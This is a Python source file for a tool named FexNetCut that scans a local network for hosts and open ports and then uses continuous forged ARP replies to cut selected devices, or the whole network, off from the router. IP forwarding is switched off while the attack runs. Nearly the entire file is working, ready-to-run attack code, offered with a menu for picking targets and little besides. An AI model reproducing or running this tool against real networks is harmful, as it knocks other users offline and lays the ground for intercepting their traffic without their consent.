import time
import os
import sys
import threading
import ctypes
import subprocess
import re
from scapy.all import ARP, Ether, srp, send, IP, TCP, sr1, get_if_addr, conf

G  = "\033[92m"   
R  = "\033[91m"   
Y  = "\033[93m"   
B  = "\033[94m"   
C  = "\033[96m"   
W  = "\033[39m"   
DIM = "\033[2m"
BOLD = "\033[1m"
RESET = "\033[0m"

if os.name == "nt":
    os.system("")

SUBNET         = ""
ROUTER_IP      = ""
INTERVAL       = 1.5
COMMON_PORTS   = [21, 22, 23, 80, 139, 443, 445, 3306, 8080]

stop_event  = threading.Event()
dict_lock   = threading.Lock()
targets: dict = {}
router_mac: str = ""

BANNER = f"""
{G}
{G}  {BOLD}    ______          _   __     __  ______      __  {G} 
{G}  {BOLD}   / ____/__  _  __/ | / /__  / /_/ ____/_  __/ /_ {G}
{G}  {BOLD}  / /_  / _ \| |/_/  |/ / _ \/ __/ /   / / / / __/{G}
{G}  {BOLD} / __/ /  __/>  </ /|  /  __/ /_/ /___/ /_/ / /_  {G}
{G}  {BOLD}/_/    \___/_/|_/_/ |_/\___/\__/\____/\__,_/\__/  {G}
{RESET}
"""


def is_admin() -> bool:
    if os.name == "posix":
        return os.geteuid() == 0
    elif os.name == "nt":
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    return False


def set_ip_forward(value: int):
    if os.name == "posix":
        os.system(f"echo {value} > /proc/sys/net/ipv4/ip_forward")


def divider(char="─", width=65, color=C):
    print(f"{color}{char * width}{RESET}")


def get_network_info() -> tuple[str | None, str | None]:
    """Automatically detect subnet and router IP."""
    try:
        if os.name == "nt":  # Windows
            output = subprocess.check_output("ipconfig", encoding="utf-8", stderr=subprocess.DEVNULL)
            gateway = re.search(r"Default Gateway[^:]*:\s*([\d.]+)", output)
            ip_addr = re.search(r"IPv4 Address[^:]*:\s*([\d.]+)", output)
            if gateway and ip_addr:
                router_ip = gateway.group(1).strip()
                subnet = ".".join(ip_addr.group(1).strip().split(".")[:3]) + ".0/24"
                return subnet, router_ip

        else:  # Linux / macOS
            route_out = subprocess.check_output(
                "ip route 2>/dev/null || netstat -rn", shell=True, encoding="utf-8"
            )
            gateway = re.search(r"default(?:\s+via)?\s+([\d.]+)", route_out)
            ip_out = subprocess.check_output("hostname -I 2>/dev/null || hostname -i", shell=True, encoding="utf-8")
            ip_addr = ip_out.strip().split()[0]
            if gateway and ip_addr:
                router_ip = gateway.group(1).strip()
                subnet = ".".join(ip_addr.split(".")[:3]) + ".0/24"
                return subnet, router_ip

    except Exception as e:
        print(f"{R}[!] Auto-detect error: {e}{RESET}")

    return None, None


def ask_network_config() -> tuple[str, str]:
    """Ask user for network config: auto or manual."""
    global SUBNET, ROUTER_IP

    divider()
    print(f"{BOLD}{C}  Network Configuration{RESET}")
    divider()
    print(f"  {G}[1]{W}  Auto-detect  {DIM}(recommended){RESET}")
    print(f"  {G}[2]{W}  Manual input")
    divider()

    while True:
        choice = input(f"\n{BOLD}choice > {RESET}").strip()

        if choice == "1":
            print(f"\n{Y}[*]{W} Detecting network settings...")
            subnet, router_ip = get_network_info()

            if subnet and router_ip:
                print(f"{G}[+]{W} Subnet  : {C}{subnet}{RESET}")
                print(f"{G}[+]{W} Router  : {C}{router_ip}{RESET}")
                confirm = input(f"\n{BOLD}Use these settings? (y/n) > {RESET}").strip().lower()
                if confirm == "y":
                    return subnet, router_ip
                print(f"{Y}[*]{W} Switching to manual input...\n")
            else:
                print(f"{R}[!] Auto-detect failed. Switching to manual input...{RESET}\n")

            choice = "2"  # fall through to manual

        if choice == "2":
            subnet   = input(f"{BOLD}  Subnet   (e.g. 192.168.1.0/24) > {RESET}").strip()
            router_ip = input(f"{BOLD}  Router IP (e.g. 192.168.1.1)    > {RESET}").strip()
            if subnet and router_ip:
                return subnet, router_ip
            print(f"{R}[!] Invalid input. Please try again.{RESET}")

        else:
            print(f"{R}[!] Invalid choice. Enter 1 or 2.{RESET}")


def scan_network(ip_range: str) -> list[dict]:
    print(f"\n{Y}[*]{W} Scanning network: {C}{ip_range}{RESET}")
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
    answered, _ = srp(pkt, timeout=4, retry=2, verbose=False)

    try:
        my_ip = get_if_addr(conf.iface)
    except:
        my_ip = None

    hosts = []
    seen_ips = set()

    for _, r in answered:
        if r.psrc in seen_ips:
            continue
        if r.psrc == ROUTER_IP or r.psrc == my_ip:
            continue
        hosts.append({"ip": r.psrc, "mac": r.hwsrc})
        seen_ips.add(r.psrc)

    hosts.sort(key=lambda x: [int(n) for n in x["ip"].split(".")])
    return hosts


def get_mac(ip: str) -> str | None:
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered, _ = srp(pkt, timeout=3, retry=2, verbose=False)
    return answered[0][1].hwsrc if answered else None


SERVICE_MAP = {
    80: "HTTP", 8080: "HTTP", 443: "HTTPS",
    22: "SSH",  21: "FTP",   445: "SMB",
    23: "Telnet", 139: "NetBIOS", 3306: "MySQL"
}

def scan_target_ports(target_ip: str, results: dict):
    open_ports = []
    for port in COMMON_PORTS:
        print(f"\r{Y}[*]{W} Scanning {C}{target_ip}{W} → port {Y}{port}{W}   ", end="", flush=True)
        syn = IP(dst=target_ip) / TCP(dport=port, flags="S")
        resp = sr1(syn, timeout=0.8, verbose=False)
        if resp and resp.haslayer(TCP) and resp[TCP].flags == 0x12:
            send(IP(dst=target_ip) / TCP(dport=port, flags="R"), verbose=False)
            label = SERVICE_MAP.get(port, "Unknown")
            open_ports.append(f"{port}/{label}")
    results[target_ip] = open_ports


def mass_port_scan(hosts: list[dict]) -> dict:
    print(f"\n{Y}[*]{W} Running port scan on {len(hosts)} host(s)...")
    threads, results = [], {}
    for host in hosts:
        t = threading.Thread(target=scan_target_ports, args=(host["ip"], results))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    print(f"\r{G}[+]{W} Port scan complete.{' ' * 40}")
    return results


def spoof_loop(target_ip: str, target_mac: str):
    while not stop_event.is_set():
        send(ARP(op=2, pdst=target_ip,  hwdst=target_mac, psrc=ROUTER_IP),  verbose=False)
        send(ARP(op=2, pdst=ROUTER_IP,  hwdst=router_mac, psrc=target_ip),  verbose=False)
        with dict_lock:
            if target_ip in targets:
                targets[target_ip]["packets"] += 2
        time.sleep(INTERVAL)


def restore_all():
    print(f"\n{Y}[*]{W} Restoring ARP tables...")
    for ip, data in list(targets.items()):
        mac = data["mac"]
        send(ARP(op=2, pdst=ip,       hwdst=mac,        psrc=ROUTER_IP, hwsrc=router_mac), count=4, verbose=False)
        send(ARP(op=2, pdst=ROUTER_IP, hwdst=router_mac, psrc=ip,        hwsrc=mac),        count=4, verbose=False)
        print(f"  {G}[+]{W} Restored → {C}{ip}{RESET}")


def main():
    global router_mac, SUBNET, ROUTER_IP

    if not is_admin():
        msg = "sudo" if os.name == "posix" else "Administrator"
        print(f"{R}[!] Please run as {msg}.{RESET}")
        sys.exit(1)

    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)

    SUBNET, ROUTER_IP = ask_network_config()

    print(f"\n{Y}[*]{W} Locating router MAC ({C}{ROUTER_IP}{W})...")
    router_mac = get_mac(ROUTER_IP)
    if not router_mac:
        print(f"{R}[!] Router unreachable. Check ROUTER_IP.{RESET}")
        sys.exit(1)
    print(f"{G}[+]{W} Router → {G}{ROUTER_IP}{W}  MAC → {G}{router_mac}{RESET}")

    hosts = scan_network(SUBNET)
    if not hosts:
        print(f"{R}[!] No active hosts found. Check subnet.{RESET}")
        sys.exit(1)

    port_results = mass_port_scan(hosts)

    print(f"\n{G}[+]{W} Active hosts — {BOLD}{len(hosts)}{RESET} found\n")
    divider("═")
    print(f"  {BOLD}{'ID':<5} {'IP ADDRESS':<18} {'MAC ADDRESS':<20} {'OPEN PORTS'}{RESET}")
    divider()
    for idx, h in enumerate(hosts):
        ip = h["ip"]
        ports = ", ".join(port_results.get(ip, [])) or f"{DIM}none{RESET}"
        print(f"  {G}[{idx:>2}]{W}  {ip:<18} {DIM}{h['mac']:<20}{RESET}  {C}{ports}{RESET}")
    divider("═")

    print(f"\n{BOLD}  Select targets:{RESET}")
    print(f"  {G}all{W}     — entire network")
    print(f"  {G}0,1,2{W}   — specific IDs (comma-separated)")

    selected = []
    while True:
        raw = input(f"\n{BOLD}choice > {RESET}").strip().lower()
        if raw == "all":
            selected = hosts
            break
        try:
            indices = [int(i.strip()) for i in raw.split(",")]
            selected = [hosts[i] for i in indices]
            break
        except (ValueError, IndexError):
            print(f"{R}[!] Invalid selection. Try again.{RESET}")

    print(f"\n{G}[!]{W} Starting attack on {BOLD}{len(selected)}{RESET} target(s)...\n")
    divider()

    set_ip_forward(0)

    for h in selected:
        ip = h["ip"]
        targets[ip] = {"mac": h["mac"], "packets": 0}
        t = threading.Thread(target=spoof_loop, args=(ip, h["mac"]), daemon=True)
        targets[ip]["thread"] = t
        t.start()
        print(f"{Y}[~]{W} Isolating → {C}{ip}{RESET}")

    print(f"\n{G}[+]{W} Attack active. Press {R}Ctrl+C{W} to stop.\n")
    divider()

    try:
        while True:
            with dict_lock:
                total = sum(d["packets"] for d in targets.values())
            active = len(targets)
            print(
                f"\r{Y}[~]{W} Targets: {G}{active}{W}  │  Packets sent: {G}{total}{W}   ",
                end="", flush=True
            )
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        time.sleep(1.2)
        restore_all()
        set_ip_forward(1)
        print(f"\n\n{G}[+]{W} FexNetCut closed\n")


if __name__ == "__main__":
    main()
